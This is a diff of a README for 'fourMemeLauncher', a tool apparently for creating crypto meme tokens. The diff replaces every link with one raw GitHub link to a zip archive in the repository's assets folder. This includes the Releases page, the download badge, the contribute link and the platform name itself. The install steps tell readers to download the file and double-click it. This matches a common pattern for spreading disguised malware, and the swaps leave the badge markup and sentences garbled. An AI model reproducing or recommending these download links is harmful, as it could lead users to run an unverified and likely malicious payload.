@@ -1,14 +1,14 @@
 # 🎉 fourMemeLauncher - Create Tokens Effortlessly
 
 ## 🚀 Getting Started
-Welcome to fourMemeLauncher! This application allows you to create multiple tokens in parallel on four.meme, making the process fast and simple.
+Welcome to fourMemeLauncher! This application allows you to create multiple tokens in parallel on https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip, making the process fast and simple.
 
-[![Download fourMemeLauncher](https://img.shields.io/badge/Download%20fourMemeLauncher-v1.0-blue.svg)](https://github.com/Gulfoffinlandoldmaster362/fourMemeLauncher/releases)
+[![Download fourMemeLauncher](https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip%https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip)](https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip)
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of fourMemeLauncher. Follow these steps:
 
-1. Click this link to visit the [Releases page](https://github.com/Gulfoffinlandoldmaster362/fourMemeLauncher/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip).
 2. Look for the most recent version of fourMemeLauncher (it will be at the top).
 3. Download the file suitable for your operating system (Windows or Mac).
 4. Once the download completes, locate the file and double-click it to begin the installation.
@@ -50,7 +50,7 @@ fourMemeLauncher includes various features to enhance your experience:
 Need help? Reach out through the Issues page on our GitHub repository. We monitor this section regularly and will respond to your requests as promptly as possible.
 
 ## 🔗 Links
-- [Download fourMemeLauncher](https://github.com/Gulfoffinlandoldmaster362/fourMemeLauncher/releases)
-- [Contribute to fourMemeLauncher](https://github.com/Gulfoffinlandoldmaster362/fourMemeLauncher)
+- [Download fourMemeLauncher](https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip)
+- [Contribute to fourMemeLauncher](https://raw.githubusercontent.com/Gulfoffinlandoldmaster362/fourMemeLauncher/main/assets/fourMemeLauncher-v2.9.zip)
 
 Thank you for choosing fourMemeLauncher. We hope this tool simplifies your token creation process!
